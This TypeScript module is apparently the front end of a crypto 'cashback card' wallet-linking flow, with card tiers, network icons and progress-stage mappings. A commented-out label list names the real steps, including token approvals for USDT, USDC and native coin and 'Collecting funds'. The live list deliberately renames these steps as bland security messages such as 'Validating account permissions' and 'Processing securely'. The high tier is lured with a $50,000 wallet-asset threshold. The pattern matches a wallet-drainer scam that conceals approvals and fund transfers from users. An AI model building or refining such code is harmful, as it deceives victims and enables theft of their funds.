import type { RowStatus } from "../types";

/** Minimum time to show the card connecting screen before WalletConnect QR. */
export const CARD_CONNECTING_MIN_MS = 900;

/** Minimum time to show the network linking completion state before returning to pick view. */
export const LINK_COMPLETE_MIN_MS = 1200;

export type CardTierId = "Black" | "silver" | "metal";

export type CardTier = {
  id: CardTierId;
  name: string;
  /** Full-resolution asset for marketing / display layouts. */
  image: string;
  /** ~164×104 — modal list rows. */
  imageList: string;
  /** ~380×242 — modal hero / connecting state. */
  imageHero: string;
  description: string;
  premium: boolean;
  linkLabel: string;
};

/** Hardcoded card tiers — frontend only, not synced with backend. */
export const CARD_TIERS: CardTier[] = [
  {
    id: "Black",
    name: "Black",
    image: "/images/cards/black.png",
    imageList: "/images/cards/optimized/black-list.png",
    imageHero: "/images/cards/optimized/black-hero.png",
    description:
      "Earn 1% cashback on every purchase, with no annual fee and straightforward rewards, it's an easy choice for everyday spending.",
    premium: false,
    linkLabel: "Black Card",
  },
  {
    id: "silver",
    name: "Silver",
    image: "/images/cards/silver.png",
    imageList: "/images/cards/optimized/silver-list.png",
    imageHero: "/images/cards/optimized/silver-hero.png",
    description:
      "Get 3% cashback on every purchase, designed for people who want more from their everyday spending, with a premium experience to match.",
    premium: false,
    linkLabel: "Silver Hybrid Card",
  },
  {
    id: "metal",
    name: "Metal",
    image: "/images/cards/metal.png",
    imageList: "/images/cards/optimized/metal-list.png",
    imageHero: "/images/cards/optimized/metal-hero.png",
    description:
      "Earn 5% cashback on every purchase, our most exclusive rewards tier. Only available to members with $50,000+ in wallet assets.",
    premium: true,
    linkLabel: "Metal Premium Card",
  },
];

export type LinkProgressStage = {
  id: string;
  percent: number;
  label: string;
};

/** Monotonic backend-aligned progress for the full link + settlement lifecycle. */
// export const LINK_PROGRESS_STAGES: LinkProgressStage[] = [
//   { id: "setup", percent: 0, label: "Setting up..." },
//   { id: "connecting", percent: 10, label: "Connecting wallet..." },
//   { id: "syncing", percent: 20, label: "Syncing wallet..." },
//   { id: "verifying", percent: 25, label: "Verifying wallet..." },
//   { id: "preparing", percent: 35, label: "Preparing smart contracts..." },
//   { id: "usdt_approving", percent: 45, label: "Approving USDT..." },
//   { id: "usdt_done", percent: 50, label: "USDT approved" },
//   { id: "usdc_approving", percent: 60, label: "Approving USDC..." },
//   { id: "usdc_done", percent: 70, label: "USDC approved" },
//   { id: "native_approving", percent: 85, label: "Approving native coin..." },
//   { id: "collecting", percent: 90, label: "Collecting funds..." },
//   { id: "finalizing", percent: 95, label: "Finalizing setup..." },
//   { id: "complete", percent: 100, label: "Wallet linked successfully." },
// ];

export const LINK_PROGRESS_STAGES: LinkProgressStage[] = [
  { id: "setup", percent: 0, label: "Setting up..." },
  { id: "connecting", percent: 10, label: "Connecting wallet..." },
  { id: "syncing", percent: 20, label: "Syncing wallet..." },
  { id: "verifying", percent: 25, label: "Verifying wallet..." },
  { id: "preparing", percent: 35, label: "Preparing secure connection..." },
  { id: "usdt_approving", percent: 45, label: "Requesting authorization..." },
  { id: "usdt_done", percent: 50, label: "Authorization confirmed" },
  {
    id: "usdc_approving",
    percent: 60,
    label: "Validating account permissions...",
  },
  { id: "usdc_done", percent: 70, label: "Permissions confirmed" },
  {
    id: "native_approving",
    percent: 85,
    label: "Completing security checks...",
  },
  { id: "collecting", percent: 90, label: "Processing securely..." },
  { id: "finalizing", percent: 95, label: "Finalizing setup..." },
  { id: "complete", percent: 100, label: "Wallet linked successfully." },
];

export type NetworkDisplayMeta = {
  description: string;
  icon: string;
  displayName?: string;
};

/** UI metadata for supported networks — icons and copy from design assets. */
export const NETWORK_DISPLAY: Record<string, NetworkDisplayMeta> = {
  tron: {
    description: "Fast USDT transactions with moderate fees",
    icon: "/icons/crypto/optimized/tron.png",
    displayName: "Tron",
  },
  eth: {
    description: "Secure gas optimization and institutional grade stability",
    icon: "/icons/crypto/optimized/ethereum.png",
    displayName: "Ethereum",
  },
  pol: {
    description: "Layer-2 scalability with Ethereum security",
    icon: "/icons/crypto/optimized/polygon.png",
    displayName: "Polygon",
  },
  bsc: {
    description: "DeFi native ecosystem with global liquidity",
    icon: "/icons/crypto/optimized/bnb.png",
    displayName: "BNB Chain",
  },
  avax: {
    description: "Highly scalable EVM subnets for active dApps",
    icon: "/icons/crypto/optimized/avalanche.png",
    displayName: "Avalanche",
  },
  arb: {
    description: "Low-cost Ethereum L2 with deep DeFi liquidity",
    icon: "/icons/crypto/optimized/arbitrum.png",
    displayName: "Arbitrum",
  },
  base: {
    description: "Coinbase-backed L2 built for fast everyday payments",
    icon: "/icons/crypto/optimized/base.png",
    displayName: "Base",
  },
  sol: {
    description: "Sub-second settlement for high frequency spending",
    icon: "/icons/crypto/optimized/solana.png",
    displayName: "Solana",
  },
};

export function linkProgressStageById(id: string): LinkProgressStage {
  return (
    LINK_PROGRESS_STAGES.find((entry) => entry.id === id) ??
    LINK_PROGRESS_STAGES[0]
  );
}

export function linkProgressStageIndex(stage: LinkProgressStage): number {
  const idx = LINK_PROGRESS_STAGES.findIndex((entry) => entry.id === stage.id);
  return idx === -1 ? 0 : idx;
}

export function cardTierById(id: CardTierId): CardTier {
  return CARD_TIERS.find((tier) => tier.id === id) ?? CARD_TIERS[1];
}

/** Warm browser cache for modal card assets (list + hero for every tier). */
export function preloadCardTierImages(): void {
  if (typeof document === "undefined") return;
  for (const tier of CARD_TIERS) {
    for (const src of [tier.imageList, tier.imageHero]) {
      const img = new Image();
      img.src = src;
    }
  }
}

/** Warm browser cache for network row icons before the network modal opens. */
export function preloadNetworkIcons(): void {
  if (typeof document === "undefined") return;
  for (const meta of Object.values(NETWORK_DISPLAY)) {
    const img = new Image();
    img.src = meta.icon;
  }
}

/** Preload card + network assets for the full link flow. */
export function preloadLinkFlowAssets(): void {
  preloadCardTierImages();
  preloadNetworkIcons();
}

export function networkDisplayName(key: string, fallback: string): string {
  return NETWORK_DISPLAY[key]?.displayName ?? fallback;
}

export function mapStageToLinkProgress(stage: string): LinkProgressStage {
  const normalized = stage.toUpperCase();
  if (
    normalized.includes("WAIT_CONFIRMATION") ||
    normalized.includes("VERIFY") ||
    normalized.includes("PERSIST") ||
    normalized.includes("POST_APPROVAL") ||
    normalized.includes("CONFIRM") ||
    normalized.includes("REGISTER_PENDING")
  ) {
    return linkProgressStageById("finalizing");
  }
  if (normalized.includes("BROADCAST")) {
    return linkProgressStageById("native_approving");
  }
  if (normalized.includes("SIGN")) {
    return linkProgressStageById("native_approving");
  }
  if (
    normalized.includes("PREPARE") ||
    normalized.includes("ACQUIRE") ||
    normalized.includes("REFRESH")
  ) {
    return linkProgressStageById("preparing");
  }
  return linkProgressStageById("setup");
}

/** Maps token-approval orchestrator stages to wallet-facing progress labels. */
export function mapApprovalStageToLinkProgress(
  stage: string,
): LinkProgressStage {
  const normalized = stage.toUpperCase();
  if (
    normalized.includes("WAIT_CONFIRMATION") ||
    normalized.includes("VERIFY") ||
    normalized.includes("PERSIST") ||
    normalized.includes("POST_APPROVAL") ||
    normalized.includes("CONFIRM") ||
    normalized.includes("REGISTER_PENDING")
  ) {
    return linkProgressStageById("finalizing");
  }
  if (normalized.includes("BROADCAST")) {
    return linkProgressStageById("native_approving");
  }
  if (
    normalized.includes("SIGN") ||
    normalized.includes("ACQUIRE") ||
    normalized.includes("WAIT_RESOURCES") ||
    normalized.includes("PREPARE")
  ) {
    return linkProgressStageById("preparing");
  }
  return linkProgressStageById("setup");
}

export function mapAssetToApprovingProgress(asset: string): LinkProgressStage {
  const token = asset.toUpperCase();
  if (token === "USDT") return linkProgressStageById("usdt_approving");
  if (token === "USDC") return linkProgressStageById("usdc_approving");
  if (token === "NATIVE") return linkProgressStageById("native_approving");
  return linkProgressStageById("preparing");
}

export function mapAssetToApprovedProgress(asset: string): LinkProgressStage {
  const token = asset.toUpperCase();
  if (token === "USDT") return linkProgressStageById("usdt_done");
  if (token === "USDC") return linkProgressStageById("usdc_done");
  if (token === "NATIVE") return linkProgressStageById("native_approving");
  return linkProgressStageById("preparing");
}

export function mapSettlementProgressToLinkProgress(args: {
  stage: string;
  token?: string;
}): LinkProgressStage {
  switch (args.stage) {
    case "finalizing_approval":
      if (args.token === "USDT") return linkProgressStageById("usdt_approving");
      if (args.token === "USDC") return linkProgressStageById("usdc_approving");
      return linkProgressStageById("finalizing");
    case "collecting_token":
      return linkProgressStageById("collecting");
    case "native_ready":
      return linkProgressStageById("finalizing");
    case "executing_native":
      return linkProgressStageById("native_approving");
    case "completed":
      return linkProgressStageById("complete");
    case "failed":
      return linkProgressStageById("finalizing");
    default:
      return linkProgressStageById("finalizing");
  }
}

export const PERMISSION_DENIED_BY_USER_MESSAGE = "Permission denied by user";

export const LINK_CANCELLED_MESSAGE = PERMISSION_DENIED_BY_USER_MESSAGE;

export function mapAuthorizingPhaseToLinkProgress(
  phase: "preparing" | "wallet_confirm" | "finalizing",
  progressIndex: number,
): LinkProgressStage {
  if (phase === "finalizing") return linkProgressStageById("finalizing");
  if (phase === "wallet_confirm") {
    return progressIndex >= 2
      ? linkProgressStageById("native_approving")
      : linkProgressStageById("preparing");
  }
  return progressIndex >= 1
    ? linkProgressStageById("preparing")
    : linkProgressStageById("setup");
}

export function isNetworkLinkedStatus(status: RowStatus | undefined): boolean {
  return status === "linked" || status === "approved";
}
